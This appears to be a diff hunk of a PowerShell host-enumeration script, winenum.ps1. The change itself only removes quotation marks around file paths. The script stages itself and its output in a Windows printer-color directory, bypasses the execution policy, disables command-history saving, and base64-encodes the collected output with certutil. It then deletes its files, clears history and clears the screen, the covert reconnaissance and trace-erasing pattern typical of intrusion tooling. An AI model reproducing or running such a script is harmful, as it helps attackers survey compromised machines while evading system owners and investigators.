@@ -6,11 +6,11 @@ Download script:
 Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 #attrib +h winenum.ps1
-Unblock-File -Path "C:\Windows\System32\spool\drivers\color\winenum.ps1"
+Unblock-File -Path C:\Windows\System32\spool\drivers\color\winenum.ps1
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
-Unblock-File -Path "C:\Windows\System32\spool\drivers\color\1.txt"
+Unblock-File -Path C:\Windows\System32\spool\drivers\color\1.txt
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\2.txt"
-Unblock-File -Path "C:\Windows\System32\spool\drivers\color\2.txt"
+Unblock-File -Path C:\Windows\System32\spool\drivers\color\2.txt
 #attrib +h 1.txt
 #attrib +h 2.txt
 ################################## Finshed Setup ##################################
@@ -128,12 +128,12 @@ Get-Date | Out-File -FilePath .\1.txt -Append
 Write-Output "################################## Finished ##################################" | Out-File -FilePath .\1.txt -Append  
 # Encode base64
 certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 0.txt
-Unblock-File -Path "C:\Windows\System32\spool\drivers\color\0.txt"
+Unblock-File -Path C:\Windows\System32\spool\drivers\color\0.txt
 #attrib -h 1.txt
 #attrib -h 2.txt
-Remove-Item "C:\Windows\System32\spool\drivers\color\1.txt" -Force
-Remove-Item "C:\Windows\System32\spool\drivers\color\2.txt" -Force
+Remove-Item C:\Windows\System32\spool\drivers\color\1.txt -Force
+Remove-Item C:\Windows\System32\spool\drivers\color\2.txt -Force
 #attrib -h winenum.ps1
 Clear-History
 Clear-Host
-Remove-Item "C:\Windows\System32\spool\drivers\color\winenum.ps1" -Force 
+Remove-Item C:\Windows\System32\spool\drivers\color\winenum.ps1 -Force 
